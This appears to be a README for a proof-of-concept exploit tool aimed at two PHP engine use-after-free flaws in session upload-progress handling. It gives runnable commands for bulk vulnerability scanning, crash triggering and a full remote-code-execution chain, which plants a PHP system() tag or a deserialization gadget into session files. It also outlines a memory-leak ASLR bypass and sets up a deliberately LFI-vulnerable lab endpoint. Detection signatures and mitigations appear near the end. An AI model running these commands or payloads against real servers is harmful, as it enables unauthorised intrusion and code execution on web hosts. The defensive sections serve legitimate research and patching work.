# php2shell PoC

Proof-of-concept for **CVE-2026-109618** and **CVE-2026-109619** — two critical use-after-free vulnerabilities in the PHP engine's `session.upload_progress` handler and Zend HashTable internals. CVSS v4.0 **9.2**. Pre-auth. Affects PHP 5.4.0 through 8.5.11.

For authorised security testing and educational purposes only.

## Background

Both flaws are in the PHP engine itself, not in any application code. Any PHP endpoint — WordPress, Drupal, Laravel, custom apps — is a valid trigger target. `session.upload_progress` runs on every `multipart/form-data` POST **before** application code, even without `session_start()`.

| CVE | Name | Bug class | Impact |
|-----|------|-----------|--------|
| CVE-2026-109618 | rawkey | OOM during HashTable key allocation leaves a half-initialised entry; cleanup frees an uninitialised pointer (UAF) | Memory disclosure, chained RCE |
| CVE-2026-109619 | stale-globals | Fatal error leaves stale references to freed request memory; a later request on the same worker reads them | RCE via forged destructor / deserialization |

### Patched versions

| Branch | Fixed in |
|--------|----------|
| 8.5 | 8.5.12 |
| 8.4 | 8.4.27 |
| 8.3 | 8.3.36 |
| 8.2 | 8.2.35 |
| 8.1 and older | EOL — no official fix. Disable `session.upload_progress.enabled` |

## Requirements

- Python 3.10+
- No external dependencies (stdlib only)

## Usage

The tool has four modes: `check`, `trigger`, `build`, and `rce`.

### check — Passive version fingerprint

Reads the `X-Powered-By` header and response body to extract the PHP version, then classifies it against the patched releases.

```bash
# Single target
python3 php2shell_poc.py check --url http://target.local/

# Bulk scan from file, output JSONL
python3 php2shell_poc.py check -f hosts.txt -o results.jsonl -v
```

**Classifications**: `likely_vulnerable`, `eol_vulnerable`, `patched`, `no_php_version`, `branch_only`, `not_affected`, `unreachable`

**Exit codes**: 0 = no vulnerable hosts, 1 = all unreachable/empty input, 2 = one or more vulnerable

### trigger — Active vulnerability trigger

Sends `multipart/form-data` POST requests that exercise the vulnerable code paths. Does **not** attempt RCE on its own — it confirms the target is vulnerable by observing OOM errors, memory leaks, or worker crashes.

```bash
# CVE-2026-109618: OOM trigger via oversized field names
python3 php2shell_poc.py trigger \
    --url http://target.local/index.php \
    --chain 109618 \
    --rounds 20 \
    --pad-kb 9000 \
    -v

# CVE-2026-109619: session upload-progress payload plant
python3 php2shell_poc.py trigger \
    --url http://target.local/index.php \
    --chain 109619 \
    --rounds 5 \
    --session-id deadbeefcafebabe1234567890abcdef
```

**Flags in output**:
- `OOM` — "Allowed memory size exhausted" in response (109618 confirmed)
- `LEAK` — high non-ASCII byte count in response body (memory disclosure)
- `CRASH` — remote disconnect / worker segfault

**Key options**:

| Flag | Default | Description |
|------|---------|-------------|
| `--chain` | 109618 | Which CVE to target |
| `--rounds` | 10 | Number of trigger requests |
| `--pad-kb` | 1200 | Body padding size for 109618 (raise if `memory_limit` is high) |
| `--session-id` | random | Fixed PHPSESSID for 109619 |
| `--payload-filename` | serialised-object probe | Custom filename for upload-progress injection |
| `--delay` | 0.5 | Seconds between rounds |

### build — Offline body dump

Writes the trigger request body to a local file for manual replay with `curl` or Burp. No network traffic.

```bash
python3 php2shell_poc.py build --chain 109618 -o payload_618.bin
python3 php2shell_poc.py build --chain 109619 -o payload_619.bin

# Replay
curl -X POST \
    -H "Content-Type: multipart/form-data; boundary=<BOUNDARY>" \
    --data-binary @payload_618.bin \
    http://target.local/index.php
```

### rce — Full RCE chain

Chains CVE-2026-109619 session planting with a second-stage trigger for code execution. Two methods are supported.

#### Method 1: LFI inclusion (default)

Plants a `<?php system('CMD'); ?>` tag into the session file via the upload-progress filename, then includes the session file through a local file inclusion vulnerability on the target.

```bash
python3 php2shell_poc.py rce \
    --url http://target.local/index.php \
    --cmd "id" \
    --lfi-url http://target.local/vuln.php \
    --lfi-param page \
    --session-path /tmp
```

**How it works**:

```
Step 1: PLANT (POST to any PHP endpoint)
  |
  |-- Form field PHPSESSID = attacker-controlled ID
  |-- Form field PHP_SESSION_UPLOAD_PROGRESS = "rce"
  |-- File upload with filename = <?php system('CMD'); ?>
  |
  '-> PHP writes filename verbatim into session file
      at {session.save_path}/sess_{PHPSESSID}

Step 2: INCLUDE (GET to LFI-vulnerable endpoint)
  |
  |-- ?page=/tmp/sess_{PHPSESSID}
  |
  '-> PHP parses session file, hits <?php ?> tag, executes it
      Command output appears in the HTTP response
```

**Key options**:

| Flag | Default | Description |
|------|---------|-------------|
| `--cmd` | (required) | OS command to execute |
| `--lfi-url` | same as `--url` | URL of the LFI-vulnerable endpoint |
| `--lfi-param` | `page` | Query parameter for the LFI |
| `--session-path` | auto-detect | `session.save_path` on the target. Auto-tries `/tmp`, `/var/lib/php/sessions`, etc. |
| `--session-id` | random | Fixed session ID |

#### Method 2: Deserialization handler mismatch

Plants a serialised PHP gadget chain into the session file. Exploits a `php_serialize` (writer) vs `php` (reader) handler mismatch: the pipe character `|` in the filename terminates the session key, and the rest is deserialised as a value. No LFI required — fires on any `session_start()`.

```bash
# Generate a gadget chain with phpggc
phpggc Laravel/RCE10 system id -s

# Plant it
python3 php2shell_poc.py rce \
    --url http://target.local/index.php \
    --cmd "id" \
    --method deser \
    --gadget 'O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{...}'
```

## RCE chain explained

### Chain A — CVE-2026-109619 + LFI / deserialization (this tool)

The most practical path. `session.upload_progress` writes the upload filename into the session file **without sanitization**. The attacker controls three things:

1. **Session ID** — fixed via a `PHPSESSID` form field (not just a cookie), giving a predictable session file path
2. **Filename** — written verbatim, can contain PHP code or serialised-object syntax
3. **Timing** — upload-progress runs before application code, on any endpoint

RCE completes through either:
- **LFI inclusion** of the session file (the planted PHP tag executes)
- **Deserialization mismatch** when the app's `session_start()` reads the poisoned session under a different serialisation handler

### Chain B — CVE-2026-109618 memory leak + ASLR bypass + UAF (not in this tool)

Harder, requires target-specific binary offsets:

1. Send ~590 oversized POST requests over ~15 min to trigger repeated OOM
2. Parse leaked worker memory from responses to find `libphp.so` base address
3. Calculate offset to `system()` for the target's exact PHP build
4. Craft a request that places a forged zval at the freed memory location
5. Request cleanup calls the forged destructor → redirects to `system(cmd)`

This is what the `--call` flag in other public PoCs (murrez, ikow) implements. It is not included here because it requires build-specific offsets.

## Lab setup

A minimal test environment using PHP's built-in server:

```bash
# Create webroot
mkdir -p lab/webroot lab/sessions

# Minimal PHP endpoint
echo '<?php echo "OK — PHP/" . PHP_VERSION . "\n"; ?>' > lab/webroot/index.php

# LFI-vulnerable endpoint (simulates common plugin/template bugs)
echo '<?php $page = $_GET["page"] ?? "default"; include($page); ?>' > lab/webroot/vuln_lfi.php

# php.ini — low memory_limit to make OOM triggerable with smaller payloads
cat > lab/php.ini << 'EOF'
memory_limit = 8M
post_max_size = 50M
upload_max_filesize = 10M
session.upload_progress.enabled = On
session.upload_progress.cleanup = Off
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
session.save_path = ./lab/sessions
session.serialize_handler = php
expose_php = On
display_errors = On
EOF

# Start server
php -c lab/php.ini -S 127.0.0.1:8088 -t lab/webroot

# --- In another terminal ---

# Check
python3 php2shell_poc.py check --url http://127.0.0.1:8088/

# Trigger OOM
python3 php2shell_poc.py trigger --url http://127.0.0.1:8088/index.php \
    --chain 109618 --rounds 5 --pad-kb 9000

# Full RCE
python3 php2shell_poc.py rce \
    --url http://127.0.0.1:8088/index.php \
    --cmd "id" \
    --lfi-url http://127.0.0.1:8088/vuln_lfi.php \
    --lfi-param page \
    --session-path ./lab/sessions
```

## Detection

Signatures for defenders (from Datadog, Abstract Security, and Sansec advisories):

**Network / WAF**:
- `multipart/form-data` POST with form field names > 1000 bytes
- `PHPSESSID` as a form field (not cookie) in multipart bodies
- PHP open tags (`<?php`, `<?=`) or serialised-object syntax (`O:NN:`) in multipart filenames
- Bursts of 10+ oversized POSTs (>1 MB) per source IP in 10 minutes

**Server logs**:
- `Allowed memory size ... exhausted` with `in Unknown on line 0`
- Worker segfaults: `exit signal Segmentation fault (11)`
- Web worker processes spawning shell children (`sh`, `bash`, `cmd.exe`)

**SIEM / EDR**:
- Unexpected files in `/tmp`, `/dev/shm`, web-writable directories
- Outbound connections from the web server user
- New cron entries or SSH keys created by `www-data` / `apache` / `nginx`

## Mitigation

1. **Patch PHP** to 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12
2. For EOL branches (8.1 and older), set `session.upload_progress.enabled = 0` and restart workers
3. On PHP 8.5, also set `fatal_error_backtraces = 0`
4. Block `multipart/form-data` at the reverse proxy if file uploads aren't needed
5. Apply WAF rules for oversized field names and PHP tags in filenames

Setting `memory_limit = -1` removes the OOM vector for 109618 but lets a single request consume all server memory. It is a tradeoff, not a fix.

**Only patching fixes these vulnerabilities.**

## References

- [Sansec: PHP2Shell Research](https://sansec.io/research/php2shell)
- [Datadog: PHP2Shell Critical Vulnerabilities](https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/)
- [Abstract Security: CVE-2026-109618 / CVE-2026-109619](https://www.abstract.security/blog/php2shell-critical-php-rce-vulnerabilities-cve-2026-109618-and-cve-2026-109619)
- [Recorded Future: PHP2Shell Exploitation](https://www.recordedfuture.com/blog/php2shell-vulnerability-exploitation)
- [watchTowr: PHP RCE FAQ](https://watchtowr.com/intelligence/php-cve-2026-109618-faq/)
- [SecurityWeek: PHP2Shell Mass Exploitation](https://www.securityweek.com/php2shell-mass-exploitation-looms-for-leaked-critical-php-flaws/)
- [Cloudflare: PHP2Shell WAF Protection](https://blog.cloudflare.com/php-vulnerabilities-waf-protection)
- GHSA-w8hw-w9fx-j79w (CVE-2026-109618)
- GHSA-6wmf-4rv5-p3rp (CVE-2026-109619)

## Disclaimer

This tool is provided for authorised penetration testing, security research, and educational purposes only. Unauthorised access to computer systems is illegal. The author assumes no liability for misuse.
